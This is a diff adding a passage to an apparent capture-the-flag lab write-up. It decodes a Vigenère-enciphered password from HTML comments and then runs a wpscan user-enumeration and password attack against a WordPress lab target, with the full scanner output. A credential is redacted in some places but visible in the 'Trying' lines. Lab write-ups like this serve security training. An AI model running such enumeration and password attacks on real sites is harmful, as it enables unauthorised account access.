@@ -140,3 +140,122 @@ Starting gobuster in directory enumeration mode
 /wordpress            (Status: 301) [Size: 312] [--> http://target.thm/wordpress/]
 /hackathons           (Status: 200) [Size: 197]
 ```
+
+Inspecting the source code at http://target.thm/hackathons has some interesting comments:
+<!-- Dvc W@iyur@123 -->
+<!-- KeepGoing -->
+
+This took me a while to catch but this is a Vigenère Cipher. The page these comments were found on mentions vinegar which is spelt close to Vigenère. Anyways, I went to [this site](https://www.dcode.fr/vigenere-cipher) and used KeepGoing as the key. This gave the following result:
+
+`Try REDACTED`
+
+I note the result and move onto http://target.thm/wordpress. I looked around and found the main article was written by a user named elyana. I decide to run wpscan. So I saved the password found earlier with the Vigenère cipher in a file called passwords.txt and ran the following:
+
+```bash
+$ wpscan --url http://target.thm/wordpress -e u -P passwords.txt 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://target.thm/wordpress/ [10.10.57.168]
+[+] Started: Wed Jul 16 21:04:02 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://target.thm/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://target.thm/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://target.thm/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://target.thm/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://target.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
+ |  - http://target.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
+
+[+] WordPress theme in use: twentytwenty
+ | Location: http://target.thm/wordpress/wp-content/themes/twentytwenty/
+ | Last Updated: 2025-04-15T00:00:00.000Z
+ | Readme: http://target.thm/wordpress/wp-content/themes/twentytwenty/readme.txt
+ | [!] The version is out of date, the latest version is 2.9
+ | Style URL: http://target.thm/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.5 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://target.thm/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 <==> (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] elyana
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://target.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] Performing password attack on Wp Login against 1 user/s
+Trying elyana / H@ckme@123 Time: 00:00:00 <=====> (1 / 1) 100.00% Time: 00:00:00
+Trying elyana / H@ckme@123 Time: 00:00:00 <===   > (1 / 2) 50.00%  ETA: ??:??:??
+[SUCCESS] - elyana / REDACTED                                                 
+
+[!] Valid Combinations Found:
+ | Username: elyana, Password: REDACTED
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Jul 16 21:04:09 2025
+[+] Requests Done: 55
+[+] Cached Requests: 6
+[+] Data Sent: 14.912 KB
+[+] Data Received: 399.444 KB
+[+] Memory used: 191.82 MB
+[+] Elapsed time: 00:00:07
+```
+
